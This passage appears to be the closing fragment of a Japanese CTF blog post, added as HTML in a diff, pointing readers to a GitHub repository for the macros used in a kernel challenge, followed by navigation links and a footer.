+<p>概略はつかめると思いますが、使っているマクロの詳細などを知りたい方は<a rel="external" href="https://github.com/rqdaA/kernel-ctf/tree/master/faulty_kernel">GitHub</a>まで。</p>
+
+        </div>
+
+    
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h">Other posts</span>
+                    <hr />
+                </div>
+                <div class="pagination__buttons">
+                        <span class="button previous">
+                            <a href="https://blog.rqda.wtf/angstrom-2024/">
+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">Angstorm 2024</span>
+                            </a>
+                        </span>
+                    
+                    
+                        <span class="button next">
+                            <a href="https://blog.rqda.wtf/dreamhack-inv-2025/">
+                                <span class="button__text">Writeup of DreamHack Invitational 2025</span>&nbsp;
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    </div>
+            </div>
+        
+</div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright copyright--user">&#169 2025 Rona 🐈</div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
